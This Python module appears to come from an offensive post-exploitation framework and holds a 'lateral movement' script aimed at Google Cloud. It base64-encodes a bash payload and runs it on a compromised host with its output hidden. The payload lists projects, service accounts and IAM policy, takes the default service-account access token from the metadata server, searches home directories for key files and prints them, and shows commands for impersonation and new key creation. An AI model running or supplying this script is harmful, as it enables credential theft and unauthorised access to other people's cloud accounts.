"""GCP project enumeration script."""

from ..base import OperatorScript, ScriptResult


class GCPProjectEnum(OperatorScript):
    """Enumerate GCP projects and service accounts for lateral movement."""
    
    name = "GCP Project Enumeration"
    description = "Enumerate GCP projects and service accounts"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] GCP PROJECT ENUMERATION"
echo "==========================="
echo ""

if ! command -v gcloud &>/dev/null; then
    echo "[-] gcloud CLI not installed"
    exit 0
fi

echo "[+] Current GCP identity:"
gcloud auth list 2>/dev/null
echo ""

echo "[+] Current project:"
gcloud config get-value project 2>/dev/null
echo ""

echo "[+] Available projects:"
gcloud projects list 2>/dev/null || echo "[-] Cannot list projects"
echo ""

echo "[+] Service accounts in current project:"
gcloud iam service-accounts list 2>/dev/null || echo "[-] Cannot list service accounts"
echo ""

echo "[+] Checking metadata service:"
echo "[*] Project ID:"
curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null
echo ""

echo "[*] Service accounts:"
curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null
echo ""

echo "[*] Default service account token:"
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null)
if [ ! -z "$TOKEN" ]; then
    echo "[+] Token obtained:"
    echo "$TOKEN" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4 | head -c 50
    echo "..."
else
    echo "[-] No token available"
fi
echo ""

echo "[+] IAM policy for current project:"
PROJECT=$(gcloud config get-value project 2>/dev/null)
if [ ! -z "$PROJECT" ]; then
    gcloud projects get-iam-policy "$PROJECT" 2>/dev/null | head -30
fi
echo ""

echo "[+] Checking for service account keys:"
find /home /root -name "*-key.json" -o -name "*serviceaccount*.json" 2>/dev/null | while read file; do
    echo "[!] Found key file: $file"
    cat "$file" | grep -E "type|project_id|client_email" | head -5
    echo ""
done
echo ""

echo "[+] GCP environment variables:"
env | grep -i gcp\|google
echo ""

echo "[+] Service account impersonation:"
echo "  gcloud auth application-default login --impersonate-service-account=SA_EMAIL"
echo "  gcloud iam service-accounts keys create key.json --iam-account=SA_EMAIL"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating GCP projects...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="GCP project enumeration executed",
                metadata={"script": "gcp_project_enum"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
